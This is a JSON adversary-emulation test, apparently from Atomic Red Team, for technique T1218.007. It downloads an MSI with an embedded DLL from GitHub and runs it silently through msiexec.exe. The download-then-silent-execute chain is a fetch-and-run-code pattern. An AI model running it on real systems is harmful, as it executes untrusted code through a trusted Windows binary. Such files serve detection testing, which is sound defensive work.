{
  "id": "628fa796-76c5-44c3-93aa-b9d8214fd568",
  "name": "Msiexec.exe - Execute Local MSI file with an embedded DLL",
  "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "3323e7f0-ddcf-4b1d-97f7-0e694ae80369",
      "type": "execute-command",
      "data": {
        "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "61251cbb-c55c-410f-b2e5-00e02138806a",
      "name": "Check dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "70b6e132-61ba-4dad-8a63-248f06b793f0",
      "name": "Resolve dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c4f701ad-08a1-46f0-b14a-004d4f71d38d",
      "name": "Re-check dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "61251cbb-c55c-410f-b2e5-00e02138806a",
      "p": "on-success",
      "o": "3323e7f0-ddcf-4b1d-97f7-0e694ae80369"
    },
    {
      "s": "61251cbb-c55c-410f-b2e5-00e02138806a",
      "p": "on-failure",
      "o": "70b6e132-61ba-4dad-8a63-248f06b793f0"
    },
    {
      "s": "70b6e132-61ba-4dad-8a63-248f06b793f0",
      "p": "on-success",
      "o": "c4f701ad-08a1-46f0-b14a-004d4f71d38d"
    },
    {
      "s": "c4f701ad-08a1-46f0-b14a-004d4f71d38d",
      "p": "on-failure",
      "o": "3323e7f0-ddcf-4b1d-97f7-0e694ae80369"
    }
  ],
  "tags": [
    "T1218.007",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "msi_payload",
      "type": "path",
      "description": "MSI file to execute",
      "value": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
    },
    {
      "name": "msi_exe",
      "type": "path",
      "description": "MSIExec File Path",
      "value": "c:\\windows\\system32\\msiexec.exe"
    },
    {
      "name": "action",
      "type": "string",
      "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
      "value": "i"
    }
  ]
}